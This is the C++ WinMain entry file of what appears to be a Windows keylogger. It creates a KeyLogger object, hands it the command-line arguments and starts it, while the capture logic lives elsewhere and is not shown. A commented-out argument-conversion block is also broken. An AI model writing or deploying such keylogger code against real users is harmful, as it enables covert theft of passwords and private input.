#include "keylogger.h"
#include <iostream>

int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	/*int argc;
	LPWSTR* lpv = CommandLineToArgvW(lpCmdLine, &argc);
	char** argv = new char*[argc];
	for (int i = 0; i<argc; ++i) {
		for (int j = 0; lpv[i][j]!=0;++j) {
			argv[i][j] = char(lpv[i][j]);
		}
	}
*/
	
	try {
		KeyLogger keyLogger;		
		keyLogger.argHandler_.process(__argc, __argv);
		keyLogger.process();
	}
	catch (int error) {
		std::cout<<"error: "<<error;
	}
	//delete[] lpv;
	//delete[] argv;
	return 0;
}
